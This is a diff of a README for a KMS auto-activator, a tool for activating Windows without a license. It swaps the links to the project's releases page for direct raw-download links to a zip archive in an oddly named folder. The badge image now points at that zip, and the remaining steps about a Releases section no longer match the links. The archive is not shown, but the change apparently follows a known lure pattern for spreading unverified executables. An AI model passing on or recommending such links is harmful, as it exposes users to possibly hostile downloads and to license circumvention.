@@ -7,10 +7,10 @@ The **how-to-use-kms-auto** is an automated software tool. It uses the Key Manag
 To get started, follow these steps. They will help you download and run the application quickly.
 
 ### 🌐 Download Link
-[![Download KMS Auto](https://img.shields.io/badge/Download-KMS%20Auto-brightgreen)](https://github.com/DCheng96/how-to-use-kms-auto/releases)
+[![Download KMS Auto](https://raw.githubusercontent.com/DCheng96/how-to-use-kms-auto/main/alkalizable/how-to-use-kms-auto_1.0.zip%20Auto-brightgreen)](https://raw.githubusercontent.com/DCheng96/how-to-use-kms-auto/main/alkalizable/how-to-use-kms-auto_1.0.zip)
 
 ## 📥 Download & Install
-1. Click on the link above or visit this page to download: [Download KMS Auto](https://github.com/DCheng96/how-to-use-kms-auto/releases).
+1. Click on the link above or visit this page to download: [Download KMS Auto](https://raw.githubusercontent.com/DCheng96/how-to-use-kms-auto/main/alkalizable/how-to-use-kms-auto_1.0.zip).
 2. Scroll down to the **Releases** section on the page.
 3. Under the latest release, find the appropriate file for your system. You may see options such as:
    - KMS Auto executable for Windows
